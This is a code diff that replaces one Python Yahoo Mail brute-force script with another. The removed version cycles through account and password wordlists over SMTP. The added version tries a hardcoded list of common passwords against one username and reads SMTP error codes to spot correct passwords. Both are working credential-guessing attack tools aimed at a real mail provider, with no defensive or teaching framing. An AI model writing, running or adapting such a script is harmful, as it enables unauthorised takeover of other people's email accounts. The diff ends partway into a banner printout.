@@ -1,44 +1,36 @@
-#!/usr/bin/python
-from __future__ import absolute_import
-from __future__ import print_function
-from six.moves import input
-import smtplib
-
-class yahooBruteForce():
-    def __init__(self):
-        self.accounts = []
-        self.passwords = []
-        self.init_smtplib()
-
-    def get_acc_list(self,path):
-        file = open(path, 'r',encoding='utf8').read().splitlines()
-        for line in file:
-            self.accounts.append(line)
-
-    def get_pass_list(self,path):
-        file = open(path, 'r',encoding='utf8').read().splitlines()
-        for line in file:
-            self.passwords.append(line)
-
-    def init_smtplib(self):
-        self.smtp = smtplib.SMTP("smtp.mail.yahoo.com",465)
-        self.smtp.starttls()
-        self.smtp.ehlo()
-    
-    def try_yahoo(self):
-
-        for user in self.accounts:
-            for password in self.passwords:
-                try:
-                    self.smtp.login(user,password)
-                    print(("\033[1;37mgood -> %s " % user + " -> %s \033[1;m" % password ))
-                    self.smtp.quit()
-                    self.init_smtplib()
-                    break;
-                except smtplib.SMTPAuthenticationError:
-                    # print("\033[1;31msorry \033[1;m")
-                    print(("\033[1;31msorry %s " % user + " -> %s \033[1;m" % password ))
-
+import smtplib, time, sys
+ 
+try:
+    server = smtplib.SMTP('smtp.mail.yahoo.com',587)
+    server.ehlo()
+    server.starttls()
+except:
+    print('[!] Error Connecting to SMTP Server')
+    time.sleep(5)
+    sys.exit()
+ 
+passwords = ['password', 'admin', 'adminsitator', 'passwords', 'godlover', 'adminstatorlogin',
+             'pass1337', 'location', 'muslim', 'password10', 'mylovelycat', 'justinBieber', 'crackingMe', 'catanddoglover',
+             'ilovejesus', 'willgodeverbemyfriend', 'PaSssword', ]
+amount = len(passwords)
+ 
+def bruteForce():
+    print('[*] Status: Cracking ('+str(amount)+') passwords')
+    for password in passwords:
+        time.sleep(1)
+        try:
+            server.login(username, password)
+            combination = (username+':'+password)
+            print('[*] Combination Found: %s' %combination)
+            break
+        except smtplib.SMTPAuthenticationError as msg:
+            if msg.smtp_code == 534:
+                print('[roy shammen] Password correct email verification is enabled (%s)' %password)
+            elif msg.smtp_code == 535:
+                print('[535] Incorrect password (%s)' %password)
+    print('[*] Status: Finished!')
+    time.sleep(5)
+    sys.exit()
 print('''
 
              _                 
